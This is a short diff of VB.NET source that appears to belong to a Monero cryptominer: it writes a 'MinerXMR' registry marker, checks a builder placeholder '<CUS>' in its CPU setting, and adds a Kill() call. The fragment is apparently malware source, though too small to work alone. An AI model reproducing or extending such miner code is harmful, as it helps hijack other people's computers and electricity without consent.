@@ -125,6 +125,8 @@ Public Class Main
 
         Try : Microsoft.Win32.Registry.CurrentUser.CreateSubKey("Software\" & HW).SetValue("MinerXMR", "True") : Catch : End Try
 
+        Kill()
+
         Try
             Try
                 If cpu.Contains("<CUS>") Then
